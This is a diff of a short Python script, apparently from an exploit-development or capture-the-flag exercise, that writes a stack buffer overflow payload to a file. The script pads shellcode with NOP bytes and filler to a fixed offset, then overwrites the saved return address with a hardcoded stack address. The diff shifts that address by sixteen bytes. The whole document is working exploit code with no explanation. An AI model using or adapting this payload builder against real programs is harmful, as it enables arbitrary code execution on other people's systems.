@@ -1,4 +1,4 @@
-#0x7fffffffdf48
+#0x7fffffffdf48 - ....38
 shellcode=''
 
 with open('RawCode','rb') as f:
@@ -9,6 +9,7 @@ with open('payload2','wb') as f:
     f.write(shellcode)
     f.write(b'\x90'*(80-8-len(shellcode)))
     f.write(b'AAAABBBBCCCCDDDDEEEEFFFF')
-    f.write(b'\x48\xdf\xff\xff\xff\x7f')
+    #f.write(b'\x48\xdf\xff\xff\xff\x7f')
+    f.write(b'\x38\xdf\xff\xff\xff\x7f')
 
 print('ok')
